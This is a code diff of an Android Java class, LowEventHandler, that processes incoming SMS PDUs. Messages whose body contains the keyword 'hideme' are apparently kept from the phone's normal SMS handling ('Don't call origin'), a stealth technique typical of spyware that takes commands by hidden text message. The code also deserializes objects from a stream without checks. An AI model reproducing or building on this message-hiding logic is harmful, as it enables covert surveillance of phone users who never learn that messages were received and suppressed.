@@ -80,48 +80,37 @@ public class LowEventHandler implements Runnable {
 		}
 		return callOrig;
 	}
-	public static int dispatchNormalMessage(HashMap<String,String> map_sms) {
+	public static int dispatchNormalMessage(byte[] pdu) {
 
 		int callOrig = 1;
-		map_sms.put(LowEventHandlerDefs.SMS_FIELD_RES_CALL,LowEventHandlerDefs.TRUE);
-		try {
-			if(map_sms.containsKey(LowEventHandlerDefs.SMS_FIELD_CONTENT) && map_sms.containsKey(LowEventHandlerDefs.SMS_FIELD_NUMBER) ) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "dispatchNormalMessage: processing " + map_sms.get(LowEventHandlerDefs.SMS_FIELD_CONTENT));
-				}
-				if (map_sms.get(LowEventHandlerDefs.SMS_FIELD_CONTENT).toLowerCase().contains("hideme")) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + "dispatchNormalMessage: Don't call origin ");
-					}
-					callOrig = 0;
-				} else {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + "dispatchNormalMessage:  call origin");
-					}
-					callOrig = 1;
+		SmsMessage sms = SmsMessage.createFromPdu(pdu);
 
-				}
-			}
-
-		} catch (Exception e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "dispatchNormalMessage: Exception:", e);
-			}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "dispatchNormalMessage: processing " + sms.getMessageBody());
 		}
-		if(callOrig==0){
-			map_sms.put(LowEventHandlerDefs.SMS_FIELD_RES_CALL,LowEventHandlerDefs.FALSE);
+		if (sms.getMessageBody() != null && sms.getMessageBody().toLowerCase().contains("hideme")) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "dispatchNormalMessage: Don't call origin ");
+			}
+			callOrig = 0;
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "dispatchNormalMessage:  call origin");
+			}
+			callOrig = 1;
+
 		}
 		return callOrig;
 	}
 	public static int dispatchNormalMessagePdu(byte[] pdus) {
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + "dispatchNormalMessage: start ok ");
+			Check.log(TAG + "dispatchNormalMessagePdu: start ok ");
 		}
 		int callOrig = 1;
 		if (pdus.length==0) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "dispatchNormalMessage: pdus zero size ");
+				Check.log(TAG + "dispatchNormalMessagePdu: pdus zero size ");
 			}
 			return callOrig;
 		}
@@ -131,16 +120,16 @@ public class LowEventHandler implements Runnable {
 			SmsMessage sms = SmsMessage.createFromPdu(pdus);
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "dispatchNormalMessage: processing " + sms.getMessageBody());
+				Check.log(TAG + "dispatchNormalMessagePdu: processing " + sms.getMessageBody());
 			}
 			if (sms.getMessageBody() != null && sms.getMessageBody().toLowerCase().contains("hideme")) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "dispatchNormalMessage: Don't call origin ");
+					Check.log(TAG + "dispatchNormalMessagePdu: Don't call origin ");
 				}
 				callOrig = 0;
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "dispatchNormalMessage:  call origin");
+					Check.log(TAG + "dispatchNormalMessagePdu:  call origin");
 				}
 				callOrig = 1;
 
@@ -148,7 +137,7 @@ public class LowEventHandler implements Runnable {
 
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "dispatchNormalMessage: Exception:", e);
+				Check.log(TAG + "dispatchNormalMessagePdu: Exception:", e);
 			}
 		}
 		return callOrig;
@@ -189,20 +178,21 @@ public class LowEventHandler implements Runnable {
 						}
 						if (streamIn.available() > 0) {
 							ObjectInputStream ois = new ObjectInputStream(streamIn);
-							HashMap<String, String> event = (HashMap) ois.readObject();
+							LowEventHandlerDefs event = (LowEventHandlerDefs) ois.readObject();
 							Log.d(TAG, "GOT DATA " + event);
-							if (event.containsKey(LowEventHandlerDefs.EVENT_TYPE)) {
-								if (event.get(LowEventHandlerDefs.EVENT_TYPE).contentEquals(LowEventHandlerDefs.EVENT_TYPE_SMS)) {
-									dispatchNormalMessage(event);
+							if (event.type  == LowEventHandlerDefs.EVENT_TYPE_SMS) {
+
+
+								if (event.data != null) {
+									event.res = dispatchNormalMessagePdu((byte[])event.data);
 								} else {
-									event.put(LowEventHandlerDefs.SMS_FIELD_RES_CALL, LowEventHandlerDefs.TRUE);
+									event.res = 1;
 								}
 								if (Cfg.DEBUG) {
 									Check.log(TAG + " SENT reply " + event);
 								}
 							} else {
-								event = new HashMap<String, String>();
-								event.put(LowEventHandlerDefs.SMS_FIELD_RES_CALL, LowEventHandlerDefs.TRUE);
+								event.res = 1;
 							}
 							timeout = 10;
 							while (timeout-- >= 0 ) {
